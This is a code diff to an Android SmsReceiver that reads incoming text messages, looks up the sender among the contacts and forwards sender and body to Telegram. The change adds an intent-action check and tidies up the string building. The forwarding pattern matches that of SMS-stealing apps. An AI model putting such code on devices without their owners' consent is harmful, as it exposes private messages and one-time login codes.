@@ -8,7 +8,6 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.provider.Telephony;
 import android.telephony.SmsMessage;
@@ -24,32 +23,34 @@ public class SmsReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        Bundle bundle = intent.getExtras();
-        Log.d("SMS", "testing");
-        if (androidx.core.content.ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-            Log.d("SMS", "permission granted");
-            // Mengambil SMS dari intent
-            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
-            if (messages != null) {
-                StringBuilder messageBuilder = new StringBuilder();
-                for (SmsMessage smsMessage : messages) {
-                    String smsBody = smsMessage.getMessageBody();
-                    messageBuilder.append(smsBody); // Combine message parts
-                }
-                String smsAddress = messages[0].getDisplayOriginatingAddress(); // Get the sender from the first message
-                String senderName = getContactName(context, smsAddress); // Get the sender's name
-                // Append the SMS body to the message builder
-                String senderFull = senderName != null ? senderName + " - " + smsAddress : smsAddress;
-                Log.d("SMS", "From: " + smsAddress + ", Message: " + messageBuilder.toString().trim());
-                StringBuilder messageBuilder2 = new StringBuilder();
-                messageBuilder2.append("From: ").append(senderFull).append("\n\n");
-                messageBuilder2.append(messageBuilder.toString().trim()).append("\n"); // Add a newline for separation
-                String combinedMessage = messageBuilder2.toString().trim();
+        // Check if the intent action matches the expected action for SMS_RECEIVED
+        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
+            if (androidx.core.content.ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                Log.d("SMS", "permission granted");
+                // Mengambil SMS dari intent
+                SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
+                if (messages != null) {
+                    StringBuilder messageBodyBuilder = new StringBuilder();
+                    for (SmsMessage smsMessage : messages) {
+                        String smsBody = smsMessage.getMessageBody();
+                        messageBodyBuilder.append(smsBody); // Combine message parts
+                    }
+                    String smsAddress = messages[0].getDisplayOriginatingAddress(); // Get the sender from the first message
+                    String senderName = getContactName(context, smsAddress); // Get the sender's name
+                    // Append the SMS body to the message builder
+                    String senderFull = senderName != null ? senderName + " - " + smsAddress : smsAddress;
+                    Log.d("SMS", "From: " + smsAddress + ", Message: " + messageBodyBuilder.toString().trim());
+                    String messageBuilder2 = "From: " + senderFull + "\n\n" +
+                            messageBodyBuilder.toString().trim() + "\n"; // Add a newline for separation
+                    String combinedMessage = messageBuilder2.trim();
 
-                sendMessageToTelegram(context, combinedMessage);
+                    sendMessageToTelegram(context, combinedMessage);
+                }
+            } else {
+                Log.d("SMSReceiver", "Permission to read SMS not granted.");
             }
-        } else {
-            Log.d("SMSReceiver", "Permission to read SMS not granted.");
+        }else {
+            Log.d("SMSReceiver", "Received intent with unexpected action: " + intent.getAction());
         }
     }
 
